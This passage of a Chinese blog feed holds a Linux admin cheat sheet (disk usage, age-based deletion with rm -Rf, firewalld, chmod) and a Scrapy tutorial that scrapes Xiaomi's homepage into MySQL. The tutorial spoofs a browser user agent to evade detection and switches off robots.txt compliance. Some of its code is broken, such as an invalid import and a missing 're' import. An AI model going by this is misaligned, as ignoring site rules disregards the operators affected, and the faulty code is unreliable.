class="line"><span class="comment"># 查看空间使用情况</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前目录下空间使用情况</span></span><br><span class="line"><span class="built_in">du</span> -lh --max-depth=1</span><br></pre></td></tr></table></figure><h3 id="3、按时间批量删除文件"><a href="#3、按时间批量删除文件" class="headerlink" title="3、按时间批量删除文件"></a>3、按时间批量删除文件</h3><p>需要根据时间删除这个目录下的文件，&#x2F;home&#x2F;lifeccp&#x2F;dicom&#x2F;studies，清理掉20天之前的无效数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/lifeccp/dicom/studies -mtime +21 -name <span class="string">&quot;*.*&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -Rf &#123;&#125; \;</span><br></pre></td></tr></table></figure><blockquote><p>简要解释该Shell命令</p></blockquote><ul><li>&#x2F;home&#x2F;lifeccp&#x2F;dicom&#x2F;studies ：准备要进行清理的任意目录</li><li>-mtime：标准语句写法</li><li>＋10：查找10天前的文件，这里用数字代表天数，＋30表示查找30天前的文件</li><li>“*.*“：希望查找的数据类型，”*.jpg”表示查找扩展名为jpg的所有文件，”*“表示查找所有文件</li><li>-exec：固定写法</li><li>rm -rf：强制删除文件，包括目录</li><li> {} \; ：固定写法，一对大括号+空格+&#x2F;+;</li></ul><p>注意：在我本人使用的时候，发现可能会存在1-2天的延后误差，比如：删除10天前的，可能删除了12天前的，大家执行完可以检查一下</p><h3 id="4、按时间查找文件"><a href="#4、按时间查找文件" class="headerlink" title="4、按时间查找文件"></a>4、按时间查找文件</h3><blockquote><p>根据日期查找相关文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /recordings/ 查找的目录 ，默认当前目录</span></span><br><span class="line"><span class="built_in">ls</span> --full-time /recordings/ | sed -n <span class="string">&#x27;/2018-03-21/p&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>按照日期范围查找相关文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find images/ -newermt <span class="string">&#x27;2021-01-01&#x27;</span> ! -newermt <span class="string">&#x27;2021-01-31&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按时间范围拷贝文件到另一台服务器（内网）</span></span><br><span class="line">scp -p ssh端口（22）<span class="string">&#x27;文件路径&#x27;</span> <span class="string">&#x27;目标主机账号&#x27;</span>@<span class="string">&#x27;IP&#x27;</span>:<span class="string">&#x27;存放到目标路径&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p> 统计文件个数</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc -l 统计文件个数</span></span><br><span class="line"><span class="built_in">ls</span> --full-time /recordings/ | sed -n <span class="string">&#x27;/2018-03-21/p&#x27;</span> | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><h3 id="5、文件、文件夹统计"><a href="#5、文件、文件夹统计" class="headerlink" title="5、文件、文件夹统计"></a>5、文件、文件夹统计</h3><h4 id="5-1、个数统计"><a href="#5-1、个数统计" class="headerlink" title="5.1、个数统计"></a>5.1、个数统计</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Linux 中可以通过 <span class="built_in">ls</span> -l 或者 find -<span class="built_in">type</span> f 来统计文件、文件夹的个数，具体操作如下。</span><br><span class="line">查看某文件夹下文件的个数：</span><br><span class="line"><span class="built_in">ls</span> -l | grep <span class="string">&quot;^-&quot;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># ls -l 列出文件及文件夹</span></span><br><span class="line"><span class="comment"># &quot;^-&quot; 以-开头的行 文件以-开头 文件夹以d开头</span></span><br><span class="line"><span class="comment"># wc -l 统计行数</span></span><br><span class="line">或者可以：</span><br><span class="line">find ./ -<span class="built_in">type</span> f | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># ./ 在当前目录查找</span></span><br><span class="line"><span class="comment"># -type f 文件类型 -name &quot;*.conf*&quot; 根据文件后缀查找</span></span><br><span class="line"><span class="comment"># wc -l 统计行数</span></span><br><span class="line">查看某文件夹下文件的个数，包括子文件夹：</span><br><span class="line"><span class="built_in">ls</span> -lR | grep <span class="string">&quot;^-&quot;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># -R 递归列出子目录的文件</span></span><br><span class="line">查看某文件夹下文件夹的个数，包括子文件夹：</span><br><span class="line"><span class="built_in">ls</span> -lR | grep <span class="string">&quot;^d&quot;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># &quot;^d&quot; 以d开头的行</span></span><br></pre></td></tr></table></figure><h4 id="5-2、大小统计"><a href="#5-2、大小统计" class="headerlink" title="5.2、大小统计"></a>5.2、大小统计</h4><p><em>使用 du、df、free 进行统计，详细见下</em></p><h5 id="1、du详解"><a href="#1、du详解" class="headerlink" title="1、du详解"></a><em>1、du详解</em></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2.1 <span class="built_in">du</span> 详解</span><br><span class="line">Linux <span class="built_in">du</span> 命令用于显示目录或文件的大小。</span><br><span class="line"><span class="built_in">du</span> 会显示指定的目录或文件所占用的磁盘空间。</span><br><span class="line">语法：</span><br><span class="line"><span class="built_in">du</span> [-abcDhHklmsSx] [目录或文件]</span><br><span class="line">参数说明：</span><br><span class="line">-a 或 -all：显示目录中文件的大小，单位 KB</span><br><span class="line">-b：显示目录中文件的大小，以字节 byte 为单位</span><br><span class="line">-c：显示目录中文件的大小，同时显示总和，单位 KB</span><br><span class="line">-k：显示目录中文件的大小，单位 KB</span><br><span class="line">-m：显示目录中文件的大小，单位 MB</span><br><span class="line">-s：仅显示目录的总值，单位 KB</span><br><span class="line">-h：--human-readable 以K，M，G为单位，提高信息的可读性。</span><br><span class="line">-x：以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。</span><br><span class="line">-H：--si 与 -h参数相同，但是 K、M、G是以1000为换算单位</span><br><span class="line">--max-depth = 1 ：遍历深度</span><br><span class="line">实例：</span><br><span class="line"><span class="built_in">du</span> -h * <span class="comment"># 显示当前目录下文件的大小</span></span><br><span class="line"><span class="built_in">du</span> -sh <span class="comment"># 查看当前文件夹大小</span></span><br><span class="line"><span class="built_in">du</span> -sh * | <span class="built_in">sort</span> -nr <span class="comment"># 统计当前文件夹（目录）大小，并按文件大小排序 -- 加了-h之后排序有问题</span></span><br><span class="line"><span class="built_in">du</span> -sk filename <span class="comment"># 查看指定文件大小</span></span><br><span class="line">使用 <span class="built_in">sort</span> 的参数 -nr 表示要以数字排序法进行反向排序，因为我们要对目录大小做排序，所以不可以使用 human-readable 的大小输出，不然目录大小中会有 K、M 等字样，会造成排序不正确。</span><br><span class="line">如果有一个进程在打开一个大文件的时候，这个大文件直接被 <span class="built_in">rm</span> 或者<span class="built_in">mv</span> 掉，则 <span class="built_in">du</span> 会更新统计数值，<span class="built_in">df</span> 不会更新统计数值，还是认为空间没有释放。直到这个打开大文件的进程被Kill掉。</span><br></pre></td></tr></table></figure><h5 id="2、df详解"><a href="#2、df详解" class="headerlink" title="2、df详解"></a>2、df详解</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">2.2 <span class="built_in">df</span> 详解</span><br><span class="line">Linux <span class="built_in">df</span> 命令显示磁盘分区上可以使用的磁盘空间。</span><br><span class="line"><span class="built_in">df</span> 可以查看一级文件夹大小、使用比例、档案系统及其挂入点，但对文件却无能为力。</span><br><span class="line"><span class="built_in">du</span>可以查看文件及文件夹的大小。</span><br><span class="line">两者配合使用，非常有效。</span><br><span class="line">比如用 <span class="built_in">df</span> 查看哪个一级目录过大，然后用 <span class="built_in">du</span> 查看文件夹或文件的大小，如此便可迅速确定症结。</span><br><span class="line">语法：</span><br><span class="line"><span class="built_in">df</span> [选项] [file]</span><br><span class="line">参数说明：</span><br><span class="line">-a： --all 包含所有的具有 0 Blocks 的文件系统，单位默认 KB</span><br><span class="line">-h：使用 -h 选项以 KB、MB、GB 的单位来显示，可读性高~~~（最常用）</span><br><span class="line">-i：查看目前档案系统 inode 的使用情形</span><br><span class="line">有的时候虽然档案系统还有空间，但若没有足够的 inode 来存放档案的信息，一样会不能增加新的档案。</span><br><span class="line">所谓的 inode 是用来存放档案及目录的基本信息 (metadata)，包含时间、档名、使用者及群组等。在分割扇区时，系统会先做出一堆 inode 以供以后使用，inode 的数量关系着系统中可以建立的档案及目录总数。如果要存的档案大部分都很小，则同样大小的硬盘中会有较多的档案，也就是说需要较多的 inode 来挂档案及目录。</span><br><span class="line">实例：</span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sda1             3.9G  300M  3.4G   8% /</span><br><span class="line">/dev/sda7             100G  188M   95G   1% /data0</span><br><span class="line">/dev/sdb1             133G   80G   47G  64% /data1</span><br><span class="line">/dev/sda6             7.8G  218M  7.2G   3% /var</span><br><span class="line">/dev/sda5             7.8G  166M  7.2G   3% /tmp</span><br><span class="line">/dev/sda3             9.7G  2.5G  6.8G  27% /usr</span><br><span class="line">tmpfs                 2.0G     0  2.0G   0% /dev/shm</span><br><span class="line">Filesystem -- 档案系统</span><br><span class="line">Mounted on -- 挂入点</span><br><span class="line">size -- 分区容量</span><br><span class="line">Used -- 已使用的大小</span><br><span class="line">Avail -- 剩下的大小</span><br><span class="line">Use% -- 使用的百分比</span><br><span class="line">FreeBSD下，当硬盘容量已满时，可能会看到已使用的百分比超过 100%，因为 FreeBSD 会留一些空间给 root，让 root 在档案系统满时，还是可以写东西到该档案系统中，以进行管理。</span><br></pre></td></tr></table></figure><h5 id="3、free详解"><a href="#3、free详解" class="headerlink" title="3、free详解"></a>3、free详解</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2.3 free 详解</span><br><span class="line">Linux free 命令可以显示 Linux 系统中空闲的、已用的物理内存及交互区内存（swap），及被内核使用的 buffer（内核缓冲区内存）。共享内存将被忽略。</span><br><span class="line">语法：</span><br><span class="line">free [参数]</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:      32948032   32767416     180616          0     139960   29878896</span><br><span class="line">-/+ buffers/cache:    2748560   30199472</span><br><span class="line">Swap:      8193140     664956    7528184</span><br><span class="line">参数说明：</span><br><span class="line">-b：以 Byte 为单位显示内存使用情况</span><br><span class="line">-k：以 KB 为单位显示内存使用情况</span><br><span class="line">-m：以 MB 为单位显示内存使用情况</span><br><span class="line">-g：以 GB 为单位显示内存使用情况</span><br><span class="line">-t：显示内存综合列</span><br></pre></td></tr></table></figure><h3 id="6、查看系统信息"><a href="#6、查看系统信息" class="headerlink" title="6、查看系统信息"></a>6、查看系统信息</h3><blockquote><p>查看内核版本</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure><blockquote><p>查看系统信息</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统信息</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 没有以上的命令，可使用一下命令查看 XX为发行版名称。如 centos-release</span></span><br><span class="line">Cat /etc/xxx-release</span><br></pre></td></tr></table></figure><blockquote><p> 查看内核和操作系统相关信息</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看操作系统相关信息</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看宽带实时使用率</span></span><br><span class="line">nload</span><br></pre></td></tr></table></figure><h3 id="7、开放及查看端口"><a href="#7、开放及查看端口" class="headerlink" title="7、开放及查看端口"></a>7、开放及查看端口</h3><blockquote><p>查看已开放端口</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看开放端口</span></span><br><span class="line">firewall-cmd --list-ports</span><br></pre></td></tr></table></figure><blockquote><p>开放及关闭端口（开放后需要要重启防火墙才生效）</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开放单个端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开放多个端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=20000-29999/tcp --permanent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=8080/tcp --permanent</span><br></pre></td></tr></table></figure><p><strong>（–permanent  为永久生效，不加为单次有效（重启失效））</strong></p><blockquote><p> 防火墙操作</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看防火墙状态</span></span><br><span class="line">systemctl status firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启防火墙</span></span><br><span class="line">systemctl start firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启防火墙</span></span><br><span class="line">systemctl restart firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机禁用</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br></pre></td></tr></table></figure><h3 id="8、文件夹或文件权限赋予"><a href="#8、文件夹或文件权限赋予" class="headerlink" title="8、文件夹或文件权限赋予"></a>8、文件夹或文件权限赋予</h3><blockquote><p>给.sh文件赋予可执行权限</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x  文件名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="built_in">chmod</span> +x test.sh</span><br></pre></td></tr></table></figure><h4 id="8-1、符号类型修改法"><a href="#8-1、符号类型修改法" class="headerlink" title="8.1、符号类型修改法"></a>8.1、符号类型修改法</h4><p>我们把九个权限分别是 <strong>user，group，others</strong>三种身份，借由<strong>u、g、o</strong>来代表，采用<strong>a</strong>表示所有权限，其余的<strong>r、w、x</strong>分别代表读、写、执行权限。使用如下表的方法</p><p><img src="https://static.luozhinet.com/c2/854d62d4b7088a7fcecaa22c44acec"></p><p>比如我们要对一个文件权限为“-rwxr-xr–”修改为“-rwxrwxr-x”,则需要对用户组身份的权限追加<strong>w</strong>权限，对其他用户追加<strong>x</strong> 权限，所以这样执行：<br>  <strong>chmod g+w, o+x filename</strong> 或者 <strong>chmod g&#x3D;rwx, o&#x3D;rx filename</strong></p><h3 id="9、扩展命令"><a href="#9、扩展命令" class="headerlink" title="9、扩展命令"></a><strong>9、扩展命令</strong></h3><h4 id="9-1、命令间隔执行"><a href="#9-1、命令间隔执行" class="headerlink" title="9.1、命令间隔执行"></a><strong>9.1、命令间隔执行</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单条命令间隔执行 </span></span><br><span class="line"><span class="comment"># -d 高亮显示本次刷新和上次刷新不同的地方  如：-d &quot;data&quot;</span></span><br><span class="line"><span class="comment"># -t 可执行复合命令 如： &quot;ps -ef | grep ps&quot;</span></span><br><span class="line">watch -l 1 <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更多帮助</span></span><br><span class="line">watch --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 目录 </tag>
            
            <tag> o </tag>
            
            <tag> 查看 </tag>
            
            <tag> public </tag>
            
            <tag> 大小 </tag>
            
            <tag> 档案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python使用Scrapy爬取小米首页的部分商品名称、价格、以及图片地址并持久化保存到MySql中</title>
      <link href="/posts/f98542131ae6/"/>
      <url>/posts/f98542131ae6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最开始选择爬小米这个网页时是因为觉得界面好看，想爬点素材做备用，这次有个重点，又是因为<strong>偷懒</strong>，看见那满屏的源代码就自己欺骗安慰自己肯定一样的，然后只看检查后面整齐的源代码了，我大概是能理解毛爷爷那句：抛弃幻想，准备战斗了，差点做吐，还是我的宝贝大佬仔仔细细逻辑非常清晰的全部检查排除了一遍发现<strong>源代码与元素部分</strong>不一样！！划重点，除此之外，如果发现<strong>xpath取不到值，一律给我看页面源代码</strong>，跟element对比，是否属性有更改或者动态渲染，至于反爬之类的，不过一般官网都会有反爬，我们学习只需要少量素材就ok了。Scrapy爬取这种类似静态页面的很简单，重点在爬虫页面的数据解析，以及setting.py和pipelines管道配置写入数据库。接下来开始我的表演。</p><hr><h2 id="Mysql安装与建立对应的表"><a href="#Mysql安装与建立对应的表" class="headerlink" title="Mysql安装与建立对应的表"></a>Mysql安装与建立对应的表</h2><p>略</p><h2 id="Scrapy安装以及配置"><a href="#Scrapy安装以及配置" class="headerlink" title="Scrapy安装以及配置"></a>Scrapy安装以及配置</h2><ul><li><p>安装与配置</p><ul><li>安装Scrapy包，打开终端，输入命令。<ul><li>1 pip install whell<br>2 pip install Scrapy</li></ul></li></ul></li><li><p>关于报错</p><ul><li>如果出现pip关键字，导致Scrapy不能安装的原因是pip版本过低。报错中也给出了提示。我们只需要找到Python安装地址的上级目录输入以下命令。<ul><li><p>python.exe -m pip install –upgrade pip</p><p><img src="https://static.luozhinet.com/78/6cdeb927a9ca0ecde87c75a0c7f317"></p></li></ul></li></ul></li></ul><hr><h2 id="Scrapy创建第一个工程以及第一个爬虫项目"><a href="#Scrapy创建第一个工程以及第一个爬虫项目" class="headerlink" title="Scrapy创建第一个工程以及第一个爬虫项目"></a>Scrapy创建第一个工程以及第一个爬虫项目</h2><ul><li>新建文件，用于存储Scrapy工程文件。我这里的文件夹名叫小米官网素材爬取。</li><li>我们在使用Scrapy框架时，需要手动执行。输入命令之后再重新打开目录就会发现多了很多文件，学习过前端部分框架的同学会发现这玩意有点像前后端分离的web项目，在爬虫文件（spiders）中创建爬取文件，解析好数据之后通过数据传输层（items）传给管道（pipelines），再在管道中处理数据持久化保存未文件或写入数据库中。<ul><li><p>cd 小米官网素材爬取 #进入文件夹<br>scrapy startproject  自定义文件名 #我的工程文件名叫xmImg<br>scrapy genspide 自定义文件名 # 我的爬虫文件名字叫imgList</p><p><img src="https://static.luozhinet.com/54/d9380cfc34cda8f36a1636283b44be"></p></li></ul></li></ul><hr><h2 id="Scrapy工作目录中的settings配置"><a href="#Scrapy工作目录中的settings配置" class="headerlink" title="Scrapy工作目录中的settings配置"></a>Scrapy工作目录中的settings配置</h2><p>找到Scrapy文件目录中的settings文件，根据以下提示一步步配置。</p><ul><li><p>配置请求头，也可以叫伪装头，一般是python模拟浏览器请求为了防止被网站识别而设置的。怎么获取请求头呢，自行百度吧。</p><ul><li>USER_AGENT &#x3D; ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.4951.54 Safari&#x2F;537.36 Edg&#x2F;101.0.1210.3’</li></ul></li><li><p>开启管道（pipeline）。</p><ul><li>ITEM_PIPELINES &#x3D; {<br>‘xmImg.pipelines.XmimgPipeline’: 300,<br>}</li></ul></li><li><p>配置数据库。</p><ul><li><h1 id="主机ip地址，如果是本地的数据库，直接localhost，否则就要写ip地址。"><a href="#主机ip地址，如果是本地的数据库，直接localhost，否则就要写ip地址。" class="headerlink" title="主机ip地址，如果是本地的数据库，直接localhost，否则就要写ip地址。"></a>主机ip地址，如果是本地的数据库，直接localhost，否则就要写ip地址。</h1>HOST &#x3D; ‘localhost’<h1 id="端口号-———类型为整数！！！———"><a href="#端口号-———类型为整数！！！———" class="headerlink" title="端口号 ———类型为整数！！！———-"></a>端口号 ———类型为整数！！！———-</h1>PORT &#x3D; 3306<h1 id="用户名"><a href="#用户名" class="headerlink" title="用户名"></a>用户名</h1>USER &#x3D; ‘root’<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1>PASSWD &#x3D; ‘******‘<h1 id="需要存入的数据库"><a href="#需要存入的数据库" class="headerlink" title="需要存入的数据库"></a>需要存入的数据库</h1>DB &#x3D; ‘xmdb’<h1 id="指定字符集，注意uft-8中的‘-’，识别不了！！"><a href="#指定字符集，注意uft-8中的‘-’，识别不了！！" class="headerlink" title="指定字符集，注意uft-8中的‘-’，识别不了！！"></a>指定字符集，注意uft-8中的‘-’，识别不了！！</h1>CHARACTER &#x3D; ‘utf8’</li></ul></li><li><p>关闭遵循的原则。初学者或者学习的时候不用遵循这个原则，否则大部分的时候爬不到东西。</p><ul><li>ROBOTSTXT_OBEY &#x3D; False<br>LOG_LEVEL=‘ERROR’</li></ul></li></ul><hr><h2 id="在创建好爬虫文件（这里是上述目录中的imgList-py文件）中开始爬取网站并解析"><a href="#在创建好爬虫文件（这里是上述目录中的imgList-py文件）中开始爬取网站并解析" class="headerlink" title="在创建好爬虫文件（这里是上述目录中的imgList.py文件）中开始爬取网站并解析"></a>在创建好爬虫文件（这里是上述目录中的imgList.py文件）中开始爬取网站并解析</h2><ul><li><p>具体网站具体分析，这里我访问的网站是<a href="https://www.mi.com/">小米商城官网</a></p></li><li><p>导入要用到的包。</p><ul><li>items是工程项目目录的下的文件。它的作用是对通过在爬虫文件页面实例化后统一格式传输到管道文件中，  <ul><li>import scrapy<br>import ..items from xmImgItem</li></ul></li></ul></li><li><p>设置文件唯一名字和请求网址。</p><ul><li>这里的name是用于运行文件时的唯一标识，start_urls是scrapy框架执行时会自动调用的。<ul><li>class ImglistSpider(scrapy.Spider):<br>name = ‘imgList’<br># allowed_domains &#x3D; [‘imgList.cn’]<br>start_urls &#x3D; [‘<a href="https://www.mi.com/&#39;\]">https://www.mi.com/&#39;\]</a><br><br>def parse(self, response):</li></ul></li></ul></li><li><p>在返回的页面解析数据。</p><ul><li>这里有一个重点，<strong>Python是一个强格式的语言</strong>，如果你在打印数据时发现跟预料的不一样，不妨找找看，是不是忘记缩进或者多缩进了。由于爬取的网站不同，xpath中的字符串是不一样的，这里简单介绍一下xpath的用法，&#x2F;&#x2F;表示跳级查找，@符号一般原来查找属性，text()表示标签内的内容。给大家讲解一下这个爬取逻辑。<strong>首先：</strong>item是items文件中XmimgItem类的实例对象。我们可以用它接收一些值。当我们爬取数据时会发现很多多余的标签，extract()是对那些标签进行剔除。只保留目标数据。<strong>其次：</strong>观察小米官网源代码我们可以发现几乎所有数据都包含在class值为first中的li标签中。把所有的在class值为first中的li标签取出来，遍历，循环获取。<strong>最后：</strong>由于部分数据数量不一样，这里再以其中某个数据集为索引遍历数组。一行行提交放在pipeline中处理写入数据库中。<ul><li><pre><code>def parse(self, response):      item\=XmimgItem()      div\_list \= response.xpath(&#39;//div\[@class=&quot;container&quot;\]/div//li\[@class=&quot;first&quot;\]&#39;)      for item1 in div\_list:          # 遍历获取值          img\_urls = item1.xpath(&#39;//div\[@class=&quot;figure figure-thumb&quot;\]/img/@data-src&#39;).extract()          title\_list \= item1.xpath(&#39;//div\[@class=&quot;title&quot;\]/text()&#39;).extract()          price\_list \= item1.xpath(&#39;//p\[@class=&quot;price&quot;\]/text()&#39;).extract()      #print(img\_urls)打印，用来测试数据      #print(title\_list)      #print(price\_list)      for index in range(0, len(title\_list) - 2):          price\_list\[index\] \= re.sub(&#39;\[\\u4e00-\\u9fa5\]&#39;, &#39;&#39;, price\_list\[index\])# 去除数据中的中文          # print(price\_list\[index\])          titles=title\_list\[index\]          price\=price\_list\[index\]          imgs\=img\_urls\[index\]          item\[&quot;title&quot;\] = titles          item\[&quot;price&quot;\] = price          item\[&quot;imgurl&quot;\] = imgs          yield item</code></pre></li></ul></li></ul></li></ul><hr><h2 id="Scrapy工作目录中的item写好要存储传输的数据"><a href="#Scrapy工作目录中的item写好要存储传输的数据" class="headerlink" title="Scrapy工作目录中的item写好要存储传输的数据"></a>Scrapy工作目录中的item写好要存储传输的数据</h2><ul><li><p>导入需要用到的包并取出爬虫文件中实例化的数据。</p></li><li><p>import scrapy</p><p>class XmimgItem(scrapy.Item):<br># define the fields for your item here like:<br># name &#x3D; scrapy.Field()<br>title&#x3D;scrapy.Field()<br>price=scrapy.Field()<br>imgurl=scrapy.Field()<br><br>pass</p></li></ul><hr><h2 id="Scrapy工作目录中的pipeline中把数据存储到配置好的数据库中"><a href="#Scrapy工作目录中的pipeline中把数据存储到配置好的数据库中" class="headerlink" title="Scrapy工作目录中的pipeline中把数据存储到配置好的数据库中"></a>Scrapy工作目录中的pipeline中把数据存储到配置好的数据库中</h2><ul><li><p>导入需要用到的包</p><ul><li>import pymysql<h1 id="加载settings文件，需要用到setting文件中配置的数据库连接属性。"><a href="#加载settings文件，需要用到setting文件中配置的数据库连接属性。" class="headerlink" title="加载settings文件，需要用到setting文件中配置的数据库连接属性。"></a>加载settings文件，需要用到setting文件中配置的数据库连接属性。</h1>from scrapy.utils.project import get_project_settings</li></ul></li><li><p>在类中导入配置以及创建连接方法</p><ul><li>class XmimgPipeline:<br>def __init__(self):<br>    settings = get_project_settings()<br><br>    self.host = settings[‘HOST’]<br>    self.port = settings[‘PORT’]<br>    self.user = settings[‘USER’]<br>    self.passwd = settings[‘PASSWD’]<br>    self.db = settings[‘DB’]<br>    self.character = settings[‘CHARACTER’]<br>    self.connect()<br><br>def connect(self):<br>    self.conn = pymysql.connect(<br>        host=self.host,<br>        port=self.port,<br>        user=self.user,<br>        password=self.passwd,<br>        db=self.db,<br>        charset=self.character<br>  